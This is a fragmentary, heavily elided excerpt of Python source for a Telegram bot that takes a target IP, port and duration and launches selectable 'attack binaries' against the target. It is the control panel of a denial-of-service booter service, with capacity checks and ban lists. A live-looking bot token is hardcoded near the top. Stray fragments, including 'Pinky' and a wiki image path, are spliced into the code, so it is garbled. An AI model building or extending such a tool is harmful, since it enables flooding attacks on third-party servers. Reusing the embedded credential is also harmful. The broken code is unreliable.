...
# ===== CONFIGURATION =====
BOT_TOKEN = "7151529676:AAGsboIysAlSx5X--_iJjbXnJmuDNVUfjqg"
...
async def run_attack_async(target_ip, target_port, duration, user_id, chat_id, binary):
    ...
    # Check if server capacity is reached
...
def attack_command(message):
    ...
    try:
        ...
        for binary in ATTACK_BINARIES:
            markup.add(InlineKeyboardButton(f"Use {binary}", callback_data=f"binary_{binary}_{ip}_{port}_{duration}_{user_id}"))
...
def binary_selection_callback(call):
    try:
        ...
        if len(data) != 6:
            ...
            return
        _, binary, ip, port, duration, user_id = data
        port = int(port)
        duration = int(duration)
        user_id = int(user_id)
        if call.from_user.id != user_id:
            bot.send_message(call.message.chat.id, "⛔ This attack is not initiated by you!")
            return
        if binary not in ATTACK_BINARIES:
            bot.send_message(call.message.chat.id, "❌ Invalid binary selected.")
            return
        ...
        threading.Thread(target=run_attack, args=(ip, port, duration, user_id, call.message.chat.id, binary)).start()
    except Exception as e:
...
def contact_command(message):
 Pinky user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
...
def process_ban_user(message):
    try:
        ...
        save_data(BAN_LIST_FILE, banned_users)
        bot.send_message(message.chat.id, f"✅ Usermediawiki/images/6/6b/Red_pog.svg.png) bot.send_message(message.chat.id, f"✅ User {user_id} has been unbanned.")
    except ValueError:
